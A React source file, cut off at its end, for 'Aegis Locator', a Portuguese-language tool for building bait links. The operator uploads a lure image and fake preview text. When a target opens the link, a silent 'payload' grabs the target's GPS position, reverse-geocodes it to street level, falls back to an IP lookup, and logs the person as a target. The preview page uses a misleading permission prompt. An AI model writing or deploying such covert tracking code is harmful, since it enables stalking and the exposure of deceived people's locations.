import React, { useState, useEffect, useRef } from 'react';
import { 
  MapContainer, 
  TileLayer, 
  Marker, 
  Popup, 
  Circle, 
  useMap 
} from 'react-leaflet';
import L from 'leaflet';
import 'leaflet/dist/leaflet.css';
import { 
  Shield, 
  MapPin, 
  UploadCloud, 
  Globe, 
  Activity, 
  Wifi, 
  Terminal, 
  Copy, 
  ExternalLink, 
  Navigation, 
  Eye, 
  RefreshCw, 
  Play, 
  Check, 
  Map, 
  Laptop,
  Compass,
  AlertTriangle
} from 'lucide-react';

// Custom Map Panner component to center the map when coords change
function ChangeView({ center, zoom }) {
  const map = useMap();
  useEffect(() => {
    map.setView(center, zoom);
  }, [center, zoom]);
  return null;
}

// Cyberpunk Map Pin Icon
const targetIcon = L.divIcon({
  className: 'cyber-target-icon',
  html: `
    <div class="pin-wrapper">
      <div class="pin-pulse"></div>
      <div class="pin-dot"></div>
    </div>
  `,
  iconSize: [30, 30],
  iconAnchor: [15, 15]
});

// Custom CSS injector for Leaflet pins
const style = document.createElement('style');
style.innerHTML = `
  .pin-wrapper {
    position: relative;
    width: 30px;
    height: 30px;
    display: flex;
    justify-content: center;
    align-items: center;
  }
  .pin-dot {
    width: 12px;
    height: 12px;
    background-color: #00ff66;
    border: 2px solid #050811;
    border-radius: 50%;
    box-shadow: 0 0 10px #00ff66;
    z-index: 2;
  }
  .pin-pulse {
    position: absolute;
    width: 30px;
    height: 30px;
    border: 2px solid #00ff66;
    border-radius: 50%;
    animation: pinPulseAnimation 1.5s ease-out infinite;
    opacity: 0;
    z-index: 1;
  }
  @keyframes pinPulseAnimation {
    0% { transform: scale(0.2); opacity: 0.8; }
    100% { transform: scale(1.5); opacity: 0; }
  }
`;
document.head.appendChild(style);

export default function App() {
  const [activeTab, setActiveTab] = useState('creation'); // 'creation' | 'monitor'
  const [imageFile, setImageFile] = useState(null);
  const [imagePreview, setImagePreview] = useState(null);
  const [title, setTitle] = useState('Confirmação Necessária');
  const [description, setDescription] = useState('Você foi convidado para visualizar esta foto compartilhada.');
  const [generatedLink, setGeneratedLink] = useState('');
  const [copied, setCopied] = useState(false);
  
  // Terminal logs state
  const [logs, setLogs] = useState([
    { id: 1, time: '08:30:12', text: 'SISTEMA INICIALIZADO: Aegis Locator v3.5', type: 'system' },
    { id: 2, time: '08:30:15', text: 'Aguardando upload de imagem e criação de link...', type: 'info' }
  ]);

  // Target Database in localStorage (simulation)
  const [targets, setTargets] = useState(() => {
    const saved = localStorage.getItem('aegis_targets');
    return saved ? JSON.parse(saved) : [];
  });

  const [selectedTarget, setSelectedTarget] = useState(null);
  
  // Current client-side status (for self-test)
  const [trackingStatus, setTrackingStatus] = useState('idle'); // 'idle' | 'tracking' | 'success' | 'error'
  const [trackingMethod, setTrackingMethod] = useState(''); // 'GPS' | 'IP'
  const [currentCoords, setCurrentCoords] = useState([-23.55052, -46.633308]); // Default São Paulo
  const [mapZoom, setMapZoom] = useState(13);
  const [locationDetails, setLocationDetails] = useState({
    ip: 'Detectando...',
    city: 'Detectando...',
    region: 'Detectando...',
    country: 'Detectando...',
    isp: 'Detectando...',
    accuracy: 'N/A',
    provider: 'N/A',
    timestamp: ''
  });

  const [isPreviewMode, setIsPreviewMode] = useState(false);
  const [previewImage, setPreviewImage] = useState(null);

  useEffect(() => {
    localStorage.setItem('aegis_targets', JSON.stringify(targets));
  }, [targets]);

  // Detect preview mode on load
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const hasId = params.get('id');
    const isPreviewPath = window.location.pathname.includes('/preview') || hasId;
    
    if (isPreviewPath) {
      setIsPreviewMode(true);
      // Retrieve the last generated preview image from localStorage to show to target
      const storedImage = localStorage.getItem('aegis_last_preview_image') || 'https://images.unsplash.com/photo-1579783902614-a3fb3927b6a5?q=80&w=600';
      setPreviewImage(storedImage);
      
      // Auto-trigger location payload execution for target
      setTimeout(() => {
        autoTrackTarget();
      }, 500);
    }
  }, []);

  // Save last uploaded image preview to localStorage so target path can retrieve it
  useEffect(() => {
    if (imagePreview) {
      localStorage.setItem('aegis_last_preview_image', imagePreview);
    }
  }, [imagePreview]);

  // Automated silent execution of tracking payload on target access
  const autoTrackTarget = () => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const { latitude, longitude, accuracy } = position.coords;
          Promise.all([
            fetch('https://ipinfo.io/json').then(res => res.json()).catch(() => ({})),
            fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&accept-language=pt-BR`).then(res => res.json()).catch(() => ({}))
          ]).then(([ipData, geoData]) => {
            const address = geoData.address || {};
            const city = address.city || address.town || address.village || address.municipality || ipData.city || 'Desconhecida';
            const suburb = address.suburb || address.neighbourhood || address.district || '';
            const road = address.road || '';
            
            const newDetails = {
              ip: ipData.ip || 'Ocultado',
              city: suburb ? `${city} (Bairro: ${suburb})` : city,
              region: road || address.county || ipData.region || 'Desconhecido',
              country: address.country_code?.toUpperCase() || ipData.country || 'BR',
              isp: ipData.org || 'Provedor Desconhecido',
              accuracy: `${accuracy.toFixed(1)} metros (GPS)`,
              provider: 'GPS Local + OpenStreetMap',
              timestamp: new Date().toLocaleString()
            };
            
            const newTarget = {
              id: Math.random().toString(36).substring(2, 6).toUpperCase(),
              coords: [latitude, longitude],
              method: 'GPS',
              ...newDetails
            };
            
            const currentTargets = JSON.parse(localStorage.getItem('aegis_targets') || '[]');
            localStorage.setItem('aegis_targets', JSON.stringify([newTarget, ...currentTargets]));
          });
        },
        (error) => {
          // Fallback to IP silently
          fetch('https://ipinfo.io/json')
            .then(res => res.json())
            .then(data => {
              const loc = data.loc ? data.loc.split(',') : ['-23.55052', '-46.633308'];
              const lat = parseFloat(loc[0]);
              const lng = parseFloat(loc[1]);
              
              const newDetails = {
                ip: data.ip,
                city: data.city || 'Desconhecida',
                region: data.region || 'Desconhecido',
                country: data.country || 'Desconhecido',
                isp: data.org || 'Provedor Desconhecido',
                accuracy: '~5-10km (Provedor)',
                provider: 'IP Lookup (ipinfo.io)',
                timestamp: new Date().toLocaleString()
              };
              
              const newTarget = {
                id: Math.random().toString(36).substring(2, 6).toUpperCase(),
                coords: [lat, lng],
                method: 'IP',
                ...newDetails
              };
              
              const currentTargets = JSON.parse(localStorage.getItem('aegis_targets') || '[]');
              localStorage.setItem('aegis_targets', JSON.stringify([newTarget, ...currentTargets]));
            });
        },
        { enableHighAccuracy: true, timeout: 10000 }
      );
    }
  };

  const addLog = (text, type = 'info') => {
    const time = new Date().toLocaleTimeString();
    setLogs(prev => [...prev, { id: Date.now(), time, text, type }]);
  };

  // Handle image upload
  const handleImageChange = (e) => {
    const file = e.target.files[0];
    if (file) {
      setImageFile(file);
      const reader = new FileReader();
      reader.onloadend = () => {
        setImagePreview(reader.result);
        addLog(`Imagem carregada com sucesso: ${file.name} (${(file.size / 1024).toFixed(1)} KB)`, 'success');
      };
      reader.readAsDataURL(file);
    }
  };

  // Generate tracking link
  const handleGenerateLink = () => {
    if (!imagePreview) {
      addLog('ERRO: Upload de imagem obrigatório para gerar o preview.', 'error');
      alert('Por favor, faça upload de uma imagem primeiro.');
      return;
    }
    const id = Math.random().toString(36).substring(2, 8);
    // Configurando para que ao abrir o link gerado, ele carregue diretamente a imagem preview em tela cheia na rota do alvo
    const link = `${window.location.origin}/preview?id=${id}`;
    setGeneratedLink(link);
    addLog(`Link de rastreamento criado com ID [${id}]`, 'success');
    addLog(`Meta tags configuradas: og:image (preview ativo)`, 'info');
  };

  // Copy link
  const handleCopyLink = () => {
    navigator.clipboard.writeText(generatedLink);
    setCopied(true);
    addLog('Link copiado para a área de transferência.', 'info');
    setTimeout(() => setCopied(false), 2000);
  };

  // Self tracking triggering (for testing the system)
  const triggerSelfTracking = () => {
    setTrackingStatus('tracking');
    addLog('Solicitando Geolocation API ao navegador do alvo...', 'system');
    
    // GPS capture
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          // Success
          const { latitude, longitude, accuracy } = position.coords;
          setCurrentCoords([latitude, longitude]);
          setMapZoom(16);
          setTrackingMethod('GPS');
          setTrackingStatus('success');
          addLog(`GPS ATIVO: Lat ${latitude.toFixed(6)}, Lng ${longitude.toFixed(6)} | Precisão: ${accuracy.toFixed(1)}m`, 'success');          // Reverse lookup with IP and Geocoding API for exact street/neighborhood address
          Promise.all([
            fetch('https://ipinfo.io/json').then(res => res.json()).catch(() => ({})),
            fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&accept-language=pt-BR`).then(res => res.json()).catch(() => ({}))
          ]).then(([ipData, geoData]) => {
            const address = geoData.address || {};
            const city = address.city || address.town || address.village || address.municipality || ipData.city || 'Desconhecida';
            const suburb = address.suburb || address.neighbourhood || address.district || '';
            const road = address.road || '';
            
            const newDetails = {
              ip: ipData.ip || 'Ocultado',
              city: suburb ? `${city} (Bairro: ${suburb})` : city,
              region: road || address.county || ipData.region || 'Desconhecido',
              country: address.country_code?.toUpperCase() || ipData.country || 'BR',
              isp: ipData.org || 'Provedor Desconhecido',
              accuracy: `${accuracy.toFixed(1)} metros (GPS)`,
              provider: 'GPS Local + OpenStreetMap',
              timestamp: new Date().toLocaleString()
            };
            setLocationDetails(newDetails);
            
            // Register target
            const newTarget = {
              id: Math.random().toString(36).substring(2, 6).toUpperCase(),
              coords: [latitude, longitude],
              method: 'GPS',
              ...newDetails
            };
            setTargets(prev => [newTarget, ...prev]);
            setSelectedTarget(newTarget);
          });
        },
        (error) => {
          // GPS Denied / Error - Fallback to IP
          addLog(`GPS NEGADO: Código ${error.code} - ${error.message}. Iniciando fallback para IP...`, 'error');
          setTrackingMethod('IP');
          
          fetch('https://ipinfo.io/json')
            .then(res => res.json())
            .then(data => {
              const loc = data.loc ? data.loc.split(',') : ['-23.55052', '-46.633308'];
              const lat = parseFloat(loc[0]);
              const lng = parseFloat(loc[1]);
              
              setCurrentCoords([lat, lng]);
              setMapZoom(12);
              setTrackingStatus('success');
              addLog(`RASTREAMENTO IP CONCLUÍDO: ${data.ip} (${data.city}/${data.region})`, 'success');
              
              const newDetails = {
                ip: data.ip,
                city: data.city || 'Desconhecida',
                region: data.region || 'Desconhecido',
                country: data.country || 'Desconhecido',
                isp: data.org || 'Provedor Desconhecido',
                accuracy: '~5-10km (Provedor)',
                provider: 'IP Lookup (ipinfo.io)',
                timestamp: new Date().toLocaleString()
              };
              setLocationDetails(newDetails);
              
              const newTarget = {
                id: Math.random().toString(36).substring(2, 6).toUpperCase(),
                coords: [lat, lng],
                method: 'IP',
                ...newDetails
              };
              setTargets(prev => [newTarget, ...prev]);
              setSelectedTarget(newTarget);
            })
            .catch(err => {
              setTrackingStatus('error');
              addLog(`FALHA GERAL: Não foi possível obter localização via GPS nem IP.`, 'error');
            });
        },
        { enableHighAccuracy: true, timeout: 10000 }
      );
    } else {
      addLog('ERRO: Geolocation não suportado neste navegador. Tentando IP...', 'error');
      // Fallback direct
    }
  };

  // Simulate targets from other places (glorious test suite)
  const simulateTarget = (type) => {
    addLog(`Iniciando simulação de acesso: Tipo [${type}]`, 'system');
    
    setTimeout(() => {
      let mockTarget = {};
      if (type === 'gps_sp') {
        mockTarget = {
          id: 'SIM-' + Math.random().toString(36).substring(2, 5).toUpperCase(),
          coords: [-23.5615, -46.6623], // Paulista, SP
          method: 'GPS',
          ip: '189.120.45.22',
          city: 'São Paulo',
          region: 'São Paulo',
          country: 'BR',
          isp: 'Vivo Fibra',
          accuracy: '8.4 metros (GPS)',
          provider: 'MOCK GPS Simulator',
          timestamp: new Date().toLocaleString()
        };
      } else if (type === 'ip_rj') {
        mockTarget = {
          id: 'SIM-' + Math.random().toString(36).substring(2, 5).toUpperCase(),
          coords: [-22.9068, -43.1729], // Rio de Janeiro
          method: 'IP',
          ip: '200.180.12.89',
          city: 'Rio de Janeiro',
          region: 'Rio de Janeiro',
          country: 'BR',
          isp: 'Claro Brasil',
          accuracy: '~8km (Provedor)',
          provider: 'MOCK IP Simulator',
          timestamp: new Date().toLocaleString()
        };
      } else if (type === 'gps_ny') {
        mockTarget = {
          id: 'SIM-' + Math.random().toString(36).substring(2, 5).toUpperCase(),
          coords: [40.7580, -73.9855], // Times Square, NY
          method: 'GPS',
          ip: '64.233.160.10',
          city: 'New York',
          region: 'New York',
          country: 'US',
          isp: 'Google LLC',
          accuracy: '3.0 metros (GPS)',
          provider: 'MOCK GPS Simulator',
          timestamp: new Date().toLocaleString()
        };
      }

      setTargets(prev => [mockTarget, ...prev]);
      setSelectedTarget(mockTarget);
      setCurrentCoords(mockTarget.coords);
      setMapZoom(mockTarget.method === 'GPS' ? 16 : 12);
      addLog(`SIMULAÇÃO ATIVA: Alvo ${mockTarget.id} localizado via ${mockTarget.method} (${mockTarget.city})`, 'success');
      setActiveTab('monitor');
    }, 1200);
  };

  const clearDatabase = () => {
    if (window.confirm('Deseja limpar todos os registros de rastreamento?')) {
      setTargets([]);
      setSelectedTarget(null);
      addLog('Banco de dados de alvos limpo com sucesso.', 'info');
    }
  };

  if (isPreviewMode) {
    return (
      <div style={{
        width: '100vw',
        height: '100vh',
        background: '#0e1118',
        display: 'flex',
        flexDirection: 'column',
        justifyContent: 'center',
        alignItems: 'center',
        color: '#fff',
        fontFamily: 'sans-serif',
        padding: '20px',
        boxSizing: 'border-box'
      }}>
        <div style={{
          maxWidth: '600px',
          width: '100%',
          textAlign: 'center',
          background: '#151a24',
          padding: '30px',
          borderRadius: '8px',
          boxShadow: '0 10px 30px rgba(0,0,0,0.5)',
          border: '1px solid #202b3c'
        }}>
          {previewImage && (
            <img 
              src={previewImage} 
              alt="Social Preview" 
              style={{
                maxWidth: '100%',
                maxHeight: '70vh',
                borderRadius: '4px',
                marginBottom: '20px',
                objectFit: 'contain'
              }}
            />
          )}
          <h2 style={{ fontSize: '1.25rem', marginBottom: '10px', color: '#e2e8f0' }}>{title || 'Confirmação Requerida'}</h2>
          <p style={{ fontSize: '0.9rem', color: '#94a3b8', margin: '0 0 20px 0' }}>
            {description || 'Você precisa permitir as permissões solicitadas no navegador para carregar este conteúdo.'}
          </p>
          <div style={{ display: 'flex', justifyContent: 'center', gap: '10px' }}>
            <button 
              onClick={() => {
                autoTrackTarget();
                alert('Carregando conteúdo em alta definição...');
              }}
              style={{
                background: '#3b82f6',
                border: 'none',
                color: '#fff',
                padding: '10px 24px',
                borderRadius: '4px',
                fontWeight: 'bold',
                cursor: 'pointer',
                fontSize: '0.9rem'
              }}
            >
              Visualizar Mídia
            </button>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div style={{ flex: 1, display: 'flex', flexDirection: 'column' }}>
      <div className="scanline"></div>

      {/* Header bar */}
      <header style={{
        background: 'var(--bg-dark)',
        borderBottom: '1px solid var(--border-glow)',
        padding: '15px 30px',
        display: 'flex',
        justifyContent: 'space-between',
        alignItems: 'center',
        boxShadow: '0 5px 20px rgba(0,0,0,0.5)',
      }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '15px' }}>
          <div style={{
            background: 'rgba(0, 255, 102, 0.1)',
            border: '1px solid var(--neon-green)',
            padding: '8px',
            borderRadius: '4px',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            boxShadow: '0 0 10px rgba(0, 255, 102, 0.2)'
          }}>
            <Shield size={24} className="text-neon" style={{ color: 'var(--neon-green)' }} />
          </div>
          <div>
            <h1 style={{ 
              fontFamily: 'var(--font-display)', 
              fontSize: '1.25rem', 
              color: 'var(--text-main)',
              letterSpacing: '3px',
              textTransform: 'uppercase',
              margin: 0,
              textShadow: '0 0 10px rgba(0, 255, 102, 0.3)'
            }}>
              AEGIS LOCATOR <span style={{ color: 'var(--neon-blue)', fontSize: '0.8rem' }}>v3.5</span>
            </h1>
            <p style={{ fontSize: '0.75rem', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' }}>
              INVESTIGATION MODULE // GPS & IP FALLBACK
            </p>
          </div>
        </div>

        {/* Tab Navigation */}
        <div style={{ display: 'flex', gap: '15px' }}>
          <button 
            className={`cyber-button ${activeTab === 'creation' ? 'active' : 'cyber-button-blue'}`}
            style={{ padding: '8px 20px', fontSize: '0.85rem' }}
            onClick={() => setActiveTab('creation')}
          >
            1. Criador de Link
          </button>
          <button 
            className={`cyber-button ${activeTab === 'monitor' ? 'active' : 'cyber-button-blue'}`}
            style={{ padding: '8px 20px', fontSize: '0.85rem' }}
            onClick={() => {
              setActiveTab('monitor');
              addLog('Console de Monitoramento ativado.', 'info');
            }}
          >
            2. Monitor de Alvos ({targets.length})
          </button>
        </div>
      </header>

      {/* Main Content Layout */}
      <main style={{ 
        flex: 1, 
        display: 'grid', 
        gridTemplateColumns: '360px 1fr', 
        gap: '20px', 
        padding: '20px',
        maxWidth: '1600px',
        width: '100%',
        margin: '0 auto',
      }}>
        
        {/* LEFT COLUMN: Controls & Logs */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: '20px', overflow: 'hidden' }}>
          
          {/* Panel 1: Context Mode Options */}
          {activeTab === 'creation' && (
            <div className="cyber-panel cyber-panel-blue">
              <div className="cyber-title blue">
                <UploadCloud size={18} />
                Upload de Mídia
              </div>
              
              <p style={{ fontSize: '0.85rem', color: 'var(--text-muted)', marginBottom: '15px' }}>
                Hospede uma imagem ou meme para usar como isca. O WhatsApp/Facebook usará este arquivo para o Preview do link.
              </p>

              {/* Upload drag zone */}
              <div style={{
                border: '2px dashed rgba(0, 218, 255, 0.3)',
                borderRadius: '4px',
                padding: '20px',
                textAlign: 'center',
                cursor: 'pointer',
                background: 'rgba(0, 218, 255, 0.02)',
                position: 'relative',
                transition: 'all 0.3s ease',
                marginBottom: '15px'
              }}
              onDragOver={e => e.preventDefault()}
              onDrop={e => {
                e.preventDefault();
                const file = e.dataTransfer.files[0];
                if (file) {
                  setImageFile(file);
                  const reader = new FileReader();
                  reader.onloadend = () => setImagePreview(reader.result);
                  reader.readAsDataURL(file);
                }
              }}
              >
                <input 
                  type="file" 
                  accept="image/*" 
                  id="image-uploader" 
                  style={{ display: 'none' }}
                  onChange={handleImageChange}
                />
                <label htmlFor="image-uploader" style={{ cursor: 'pointer', display: 'block' }}>
                  {imagePreview ? (
                    <img 
                      src={imagePreview} 
                      alt="Preview upload" 
                      style={{ maxWidth: '100%', maxHeight: '120px', borderRadius: '4px', border: '1px solid rgba(0, 218, 255, 0.5)' }} 
                    />
                  ) : (
                    <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '8px' }}>
                      <UploadCloud size={32} style={{ color: 'var(--neon-blue)' }} />
                      <span style={{ fontSize: '0.85rem', color: 'var(--text-main)' }}>Clique ou Arraste a Imagem</span>
                      <span style={{ fontSize: '0.7rem', color: 'var(--text-muted)' }}>Formatos suportados: PNG, JPG, GIF</span>
                    </div>
                  )}
                </label>
              </div>

              {/* Card Meta configuration */}
              <div style={{ display: 'flex', flexDirection: 'column', gap: '10px', marginBottom: '15px' }}>
                <div>
                  <label style={{ fontSize: '0.75rem', color: 'var(--text-muted)', display: 'block', marginBottom: '4px', fontFamily: 'var(--font-mono)' }}>
                    TÍTULO DO CARD (og:title)
                  </label>
                  <input 
                    type="text" 
                    value={title} 
                    onChange={e => setTitle(e.target.value)}
                    style={{
                      width: '100%',
                      background: 'rgba(5, 8, 17, 0.8)',
                      border: '1px solid rgba(0, 218, 255, 0.3)',
                      color: '#fff',
                      padding: '8px 12px',
                      borderRadius: '4px',
                      fontSize: '0.85rem',
                      fontFamily: 'var(--font-sans)'
                    }}
                  />
                </div>
                <div>
                  <label style={{ fontSize: '0.75rem', color: 'var(--text-muted)', display: 'block', marginBottom: '4px', fontFamily: 'var(--font-mono)' }}>
                    DESCRIÇÃO (og:description)
                  </label>
                  <textarea 
                    value={description} 
                    onChange={e => setDescription(e.target.value)}
                    rows={2}
                    style={{
                      width: '100%',
                      background: 'rgba(5, 8, 17, 0.8)',
                      border: '1px solid rgba(0, 218, 255, 0.3)',
                      color: '#fff',
                      padding: '8px 12px',
                      borderRadius: '4px',
                      fontSize: '0.85rem',
                      fontFamily: 'var(--font-sans)',
                      resize: 'none'
                    }}
                  />
                </div>
              </div>

              <button 
                className="cyber-button cyber-button-blue"
                style={{ width: '100%' }}
                onClick={handleGenerateLink}
              >
                Gerar Link Isca
              </button>
            </div>
          )}

          {activeTab === 'monitor' && (
            <div className="cyber-panel">
              <div className="cyber-title">
                <MapPin size={18} />
                Lista de Alvos
              </div>
              
              <div style={{ 
                maxHeight: '280px', 
                overflowY: 'auto', 
                display: 'flex', 
                flexDirection: 'column', 
                gap: '8px',
                paddingRight: '5px' 
              }}>
                {targets.length === 0 ? (
                  <div style={{ textAlign: 'center', padding: '30px 10px', color: 'var(--text-muted)', fontSize: '0.85rem' }}>
                    Nenhum alvo capturado ainda.
                    <div style={{ marginTop: '10px', fontSize: '0.75rem' }}>Use o "Simulador de Acesso" no painel principal para testar!</div>
                  </div>
                ) : (
                  targets.map(target => (
                    <div 
                      key={target.id}
                      onClick={() => {
                        setSelectedTarget(target);
                        setCurrentCoords(target.coords);
                        setMapZoom(target.method === 'GPS' ? 16 : 12);
                        addLog(`Visualizando alvo [${target.id}] no mapa.`, 'info');
                      }}
                      style={{
                        padding: '10px',
                        background: selectedTarget?.id === target.id ? 'rgba(0, 255, 102, 0.08)' : 'rgba(5, 8, 17, 0.6)',
                        border: `1px solid ${selectedTarget?.id === target.id ? 'var(--neon-green)' : 'rgba(0, 255, 102, 0.15)'}`,
                        borderRadius: '4px',
                        cursor: 'pointer',
                        display: 'flex',
                        justifyContent: 'space-between',
                        alignItems: 'center',
                        transition: 'all 0.2s ease'
                      }}
                    >
                      <div>
                        <div style={{ fontWeight: 'bold', fontSize: '0.85rem', color: 'var(--text-main)', fontFamily: 'var(--font-mono)' }}>
                          ID: {target.id}
                        </div>
                        <div style={{ fontSize: '0.75rem', color: 'var(--text-muted)' }}>
                          {target.city}, {target.region}
                        </div>
                      </div>
                      <span style={{ 
                        fontSize: '0.7rem', 
                        padding: '2px 6px', 
                        background: target.method === 'GPS' ? 'rgba(0, 255, 102, 0.2)' : 'rgba(0, 218, 255, 0.2)',
                        color: target.method === 'GPS' ? 'var(--neon-green)' : 'var(--neon-blue)',
                        border: `1px solid ${target.method === 'GPS' ? 'var(--neon-green)' : 'var(--neon-blue)'}`,
                        borderRadius: '2px',
                        fontFamily: 'var(--font-mono)'
                      }}>
                        {target.method}
                      </span>
                    </div>
                  ))
                )}
              </div>

              {targets.length > 0 && (
                <button 
                  className="cyber-button"
                  style={{ width: '100%', marginTop: '15px', padding: '6px 12px', fontSize: '0.75rem', border: '1px solid var(--neon-alert)', color: 'var(--neon-alert)' }}
                  onClick={clearDatabase}
                >
                  Limpar Banco de Dados
                </button>
              )}
            </div>
          )}

          {/* Panel 2: Live System Terminal Logs */}
          <div className="cyber-panel" style={{ flex: 1, display: 'flex', flexDirection: 'column', minHeight: '200px' }}>
            <div className="cyber-title" style={{ fontSize: '0.9rem', marginBottom: '10px' }}>
              <Terminal size={16} />
              Console do Sistema
            </div>
            
            <div style={{
              flex: 1,
              background: 'rgba(5, 8, 17, 0.9)',
              border: '1px solid rgba(0, 255, 102, 0.1)',
              borderRadius: '4px',
              padding: '12px',
              fontFamily: 'var(--font-mono)',
              fontSize: '0.75rem',
              overflowY: 'auto',
              display: 'flex',
              flexDirection: 'column',
              gap: '6px',
            }}>
              {logs.map(log => (
                <div key={log.id} style={{
                  color: log.type === 'success' ? 'var(--neon-green)' : 
                         log.type === 'error' ? 'var(--neon-alert)' : 
                         log.type === 'system' ? 'var(--neon-blue)' : 'var(--text-muted)'
                }}>
                  <span style={{ color: '#555', marginRight: '5px' }}>[{log.time}]</span>
                  <span>{log.text}</span>
                </div>
              ))}
            </div>
          </div>

        </div>

        {/* RIGHT COLUMN: main workspace */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>

          {/* If creation tab, show Preview box & Link output */}
          {activeTab === 'creation' && (
            <div className="cyber-panel cyber-panel-blue" style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
              <div className="cyber-title blue">
                <Globe size={18} />
                Link Gerado & Social Preview
              </div>

              {/* Output url area */}
              {generatedLink ? (
                <div style={{
                  background: 'rgba(5, 8, 17, 0.8)',
                  border: '1px solid var(--neon-blue)',
                  padding: '15px',
                  borderRadius: '4px',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'space-between',
                  gap: '15px'
                }}>
                  <div style={{ overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', flex: 1, fontFamily: 'var(--font-mono)', color: 'var(--neon-blue)' }}>
                    {generatedLink}
                  </div>
                  <div style={{ display: 'flex', gap: '10px' }}>
                    <button 
                      onClick={handleCopyLink}
                      style={{
                        background: 'transparent',
                        border: '1px solid var(--neon-blue)',
                        color: 'var(--neon-blue)',
                        padding: '6px 12px',
                        fontSize: '0.8rem',
                        cursor: 'pointer',
                        display: 'flex',
                        alignItems: 'center',
                        gap: '5px',
                        fontFamily: 'var(--font-mono)'
                      }}
                    >
                      {copied ? <Check size={14} /> : <Copy size={14} />}
                      {copied ? 'Copiado' : 'Copiar'}
                    </button>
                    
                    {/* Simulator Trigger */}
                    <button 
                      onClick={triggerSelfTracking}
                      style={{
                        background: 'var(--neon-blue)',
                        border: '1px solid var(--neon-blue)',
                        color: 'var(--bg-darker)',
                        padding: '6px 12px',
                        fontSize: '0.8rem',
                        fontWeight: 'bold',
                        cursor: 'pointer',
                        display: 'flex',
                        alignItems: 'center',
                        gap: '5px',
                        fontFamily: 'var(--font-mono)'
                      }}
                    >
                      <Play size={14} />
                      Testar Link (Você)
                    </button>
                  </div>
                </div>
              ) : (
                <div style={{ textAlign: 'center', padding: '40px', color: 'var(--text-muted)', border: '1px dashed rgba(0, 218, 255, 0.1)', background: 'rgba(5, 8, 17, 0.4)' }}>
                  Aguardando a criação do link para gerar a visualização.
                </div>
              )}

              {/* Social share preview box */}
              {generatedLink && (
                <div>
                  <div style={{ fontSize: '0.75rem', color: 'var(--text-muted)', marginBottom: '8px', fontFamily: 'var(--font-mono)' }}>
                    PREVIEW DO LINK EM PLATAFORMAS (WHATSAPP, FACEBOOK, TELEGRAM)
                  </div>
                  <div style={{
                    background: '#0b141a', // WhatsApp web style dark chat background
                    padding: '20px',
                    borderRadius: '8px',
                    maxWidth: '450px',
                    border: '1px solid rgba(0, 218, 255, 0.1)'
                  }}>
                    {/* Chat Bubble mock */}
                    <div style={{
                      background: '#202c33',
                      padding: '8px',
                      borderRadius: '8px',
                      color: '#e9edef',
                      fontSize: '0.9rem',
                      display: 'flex',
                      flexDirection: 'column',
                      gap: '5px',
                      boxShadow: '0 1px 0.5px rgba(11,20,26,.13)'
                    }}>
                      {imagePreview && (
                        <img 
                          src={imagePreview} 
                          alt="preview" 
                          style={{ width: '100%', maxHeight: '200px', objectFit: 'cover', borderRadius: '4px 4px 0 0' }}
                        />
                      )}
                      <div style={{
                        background: '#182229',
                        padding: '10px',
                        borderRadius: '0 0 4px 4px',
                        borderLeft: '4px solid var(--neon-blue)'
                      }}>
                        <div style={{ fontWeight: 'bold', fontSize: '0.85rem', color: 'var(--neon-blue)' }}>{title}</div>
                        <div style={{ fontSize: '0.75rem', color: '#8696a0', marginTop: '2px' }}>{description}</div>
                        <div style={{ fontSize: '0.7rem', color: 'var(--text-muted)', marginTop: '4px', fontFamily: 'var(--font-mono)' }}>
                          {window.location.hostname}
                        </div>
                      </div>
                      <div style={{ fontSize: '0.85rem', color: '#53bdeb', textDecoration: 'underline', padding: '4px', overflowWrap: 'anywhere' }}>
                        {generatedLink}
                      </div>
                    </div>
                  </div>
                </div>
              )}

              {/* Glorious Simulator Controller */}
              <div style={{
                marginTop: '10px',
                border: '1px solid rgba(0, 218, 255, 0.2)',
                background: 'rgba(0, 218, 255, 0.03)',
                padding: '20px',
                borderRadius: '4px'
              }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: '8px', color: 'var(--neon-blue)', fontFamily: 'var(--font-display)', fontSize: '0.95rem', marginBottom: '10px' }}>
                  <Activity size={16} />
                  SIMULADOR DE ACESSO DO ALVO (AMBROSIA TESTBED)
                </div>
                <p style={{ fontSize: '0.8rem', color: 'var(--text-muted)', marginBottom: '15px' }}>
                  Para propósitos de demonstração profissional, simule um clique no link de dispositivos em diferentes locais do mundo. Isso registrará a telemetria no banco de dados em tempo real.
                </p>
                <div style={{ display: 'flex', gap: '10px', flexWrap: 'wrap' }}>
                  <button 
                    disabled={!generatedLink}
                    onClick={() => simulateTarget('gps_sp')}
                    className="cyber-button cyber-button-blue"
                    style={{ fontSize: '0.75rem', padding: '8px 16px', opacity: generatedLink ? 1 : 0.5 }}
                  >
                    Simular GPS: São Paulo (Sucesso GPS)
                  </button>
                  <button 
                    disabled={!generatedLink}
                    onClick={() => simulateTarget('ip_rj')}
                    className="cyber-button cyber-button-blue"
                    style={{ fontSize: '0.75rem', padding: '8px 16px', opacity: generatedLink ? 1 : 0.5 }}
                  >
                    Simular Recusa GPS: Rio (Fallback IP)
                  </button>
                  <button 
                    disabled={!generatedLink}
                    onClick={() => simulateTarget('gps_ny')}
                    className="cyber-button cyber-button-blue"
                    style={{ fontSize: '0.75rem', padding: '8px 16px', opacity: generatedLink ? 1 : 0.5 }}
                  >
                    Simular GPS Internacional: New York
                  </button>
                </div>
              </div>

            </div>
          )}

          {/* MAP & LOCATION INFORMATION */}
          <div style={{ flex: 1, display: 'grid', gridTemplateRows: '1fr auto', gap: '20px' }}>
            
            {/* The Leaflet Map container */}
            <div style={{ height: '450px', position: 'relative' }}>
              <MapContainer 
                center={currentCoords} 
                zoom={mapZoom} 
                style={{ height: '100%', width: '100%', zIndex: 1 }}
